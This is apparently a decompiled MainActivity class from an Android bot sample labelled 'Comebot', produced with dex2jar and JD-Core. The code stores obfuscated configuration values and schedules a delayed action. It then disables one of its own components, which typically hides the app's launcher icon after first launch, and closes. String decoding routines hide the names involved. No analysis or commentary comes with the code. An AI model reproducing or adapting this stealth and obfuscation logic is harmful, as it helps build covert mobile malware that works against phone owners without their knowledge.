package anu_bispro.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.os.Bundle;

public class MainActivity extends Activity {
  d a = new d();
  
  a b = new a();
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903043);
    this.b.a((Context)this, d.a("\036G\035C"), b.a("]GWU^"));
    this.b.a((Context)this, d.a("\000C\002C\030P\021R/U\007U"), b.a("]GWU^"));
    this.b.a((Context)this, d.a("B\025J/U\007U"), b.a("]GWU^"));
    this.b.a((Context)this, d.a("H\025R\007I\002M"), b.a("]GWU^"));
    this.b.a((Context)this, d.a("A\000U"), b.a("]GWU^"));
    this.b.a((Context)this, d.a("\003G\006C/O\036L"), "");
    this.b.a((Context)this, b.a("\\COhNKYCI"), d.a("@\021J\003C"));
    a a1 = this.b;
    this.a.getClass();
    a.a((Context)this, "", 14000L);
    String str = getApplicationContext().getPackageName();
    ComponentName componentName = new ComponentName(str, (new StringBuilder()).insert(0, str).append(b.a("\025kZOUgXRRPRRB")).toString());
    getPackageManager().setComponentEnabledSetting(componentName, 2, 1);
    finish();
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/MainActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */